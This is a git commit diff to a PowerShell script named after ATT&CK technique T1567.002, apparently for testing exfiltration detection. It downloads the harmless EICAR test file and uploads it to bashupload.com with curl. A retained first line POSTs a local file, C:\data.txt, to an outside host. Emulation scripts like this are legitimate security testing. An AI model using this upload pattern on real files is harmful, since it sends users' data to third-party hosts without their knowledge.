fcc3fbcc5706fdd1cb6764283728cb515be71ce2
Andre Fernandes <andre.fernandes86@gmail.com>
2025-03-04 23:44:27 -0600

    Update T1567.002.ps1

--- T1567.002.ps1
+++ T1567.002.ps1
@@ -1,1 +1,21 @@
 Invoke-WebRequest -Uri "http://malware.wicar.org/data/eicar.com" -Method Post -InFile "C:\data.txt"
+
+# Define the file path
+$FilePath = "C:\Users\Public\eicar.com"
+
+# Download the EICAR test file if it doesn't already exist
+if (!(Test-Path $FilePath)) {
+    Invoke-WebRequest -Uri "http://malware.wicar.org/data/eicar.com" -OutFile $FilePath
+    Write-Output "EICAR test file downloaded."
+} else {
+    Write-Output "EICAR test file already exists."
+}
+
+# Define the upload URL
+$UploadURL = "https://bashupload.com/eicar.com"
+
+# Exfiltrate the file using curl
+$curlCommand = "curl -T `"$FilePath`" `"$UploadURL`""
+Invoke-Expression $curlCommand
+
+Write-Output "File uploaded to bashupload.com"
